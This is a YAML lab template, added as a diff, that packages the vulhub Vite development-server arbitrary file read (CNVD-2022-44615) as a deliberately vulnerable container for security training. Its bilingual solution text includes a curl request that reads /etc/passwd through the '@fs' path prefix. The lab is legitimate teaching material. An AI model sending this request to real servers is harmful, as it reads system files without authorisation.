@@ -1,0 +1,83 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-vite-cnvd-2022-44615
+  name: Vite Development Server Arbitrary File Read
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - vite
+  description: Vite — Vite Development Server Arbitrary File Read (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/vite/CNVD-2022-44615
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/vite/CNVD-2022-44615
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - path-traversal
+    - vite
+    difficulty: medium
+    summary: Vite Development Server Arbitrary File Read
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/vite/CNVD-2022-44615
+        Vite is a modern frontend build tool that provides a faster and leaner development experience for modern web projects. It consists of two major parts: a dev server with Hot Module Replacement (HMR) capability, and a build command that bundles your code with Rollup.
+        In versions of Vite before 2.3.0, arbitrary files on the filesystem can be read using the `@fs` prefix.
+        References:
+        - <https://github.com/vitejs/vite/issues/2820>
+        # Environment Setup
+        Execute the following command to start a Vite 2.1.5 development server:
+        $ docker compose up -d
+        After the server starts, you can access the Vite development environment at `http://your-ip:3000`.
+        > Note: The development server of the old version of Vite defaults to port 3000, while the new version defaults to port 5173, please pay attention to the difference.
+        # Vulnerability Reproduction
+        You can read arbitrary files on the filesystem by using the standard `@fs` prefix:
+        $ curl "http://your-ip:3000/@fs/etc/passwd"
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/vite/CNVD-2022-44615
+        Vite is a modern frontend build tool that provides a faster and leaner development experience for modern web projects. It consists of two major parts: a dev server with Hot Module Replacement (HMR) capability, and a build command that bundles your code with Rollup.
+        In versions of Vite before 2.3.0, arbitrary files on the filesystem can be read using the `@fs` prefix.
+        References:
+        - <https://github.com/vitejs/vite/issues/2820>
+        # Environment Setup
+        Execute the following command to start a Vite 2.1.5 development server:
+        $ docker compose up -d
+        After the server starts, you can access the Vite development environment at `http://your-ip:3000`.
+        > Note: The development server of the old version of Vite defaults to port 3000, while the new version defaults to port 5173, please pay attention to the difference.
+        # Vulnerability Reproduction
+        You can read arbitrary files on the filesystem by using the standard `@fs` prefix:
+        $ curl "http://your-ip:3000/@fs/etc/passwd"
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_3000
+    group:
+      fr: Accès
+      en: Access
+    label: web 3000/tcp
+    type: port
+    default: 3000
+services:
+  web:
+    role: main
+    image: vulhub/vite
+    tag: 2.1.5@sha256:8f1ea297b8ee49b0d7a7826d8c84771454cfd2a4c339008b090a42942e3260c8
+    frozen: true
+    ports:
+    - container: 3000
+      host: '{{ form.port_3000 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_3000 }}
